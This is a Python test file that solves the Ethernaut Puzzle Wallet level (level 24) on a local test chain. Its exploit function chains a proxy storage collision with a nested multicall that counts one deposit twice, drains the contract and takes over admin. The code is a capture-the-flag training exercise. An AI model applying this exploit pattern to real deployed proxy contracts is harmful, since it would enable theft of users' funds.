from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv24_puzzle_wallet import PuzzleWallet, PuzzleProxy


@default_chain.connect()
def test_lv24():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv24()
    exploit_lv24(contract, ethernaut.attacker)
    ethernaut.check_lv24(contract)

def exploit_lv24(contract: PuzzleProxy, attacker: Account):
    # Attack vector: storage collisions + passing multicall to multicall to evade the check of using deposti function multiple times
    # Training: combining multiple techniques together

    wallet = PuzzleWallet(contract)

    simple_deposit_selector    = Abi.encode_with_selector(wallet.deposit.selector, [], [])
    multicall_deposit_selector = Abi.encode_with_selector(wallet.multicall.selector,['bytes[]'], [[simple_deposit_selector]])
    
    contract.proposeNewAdmin(attacker)
    wallet.addToWhitelist(attacker)
    wallet.multicall([simple_deposit_selector, multicall_deposit_selector], value=10 * 10**18)
    wallet.execute(attacker, 20 * 10**18, bytes())
    wallet.setMaxBalance(int(str(attacker.address), 16))
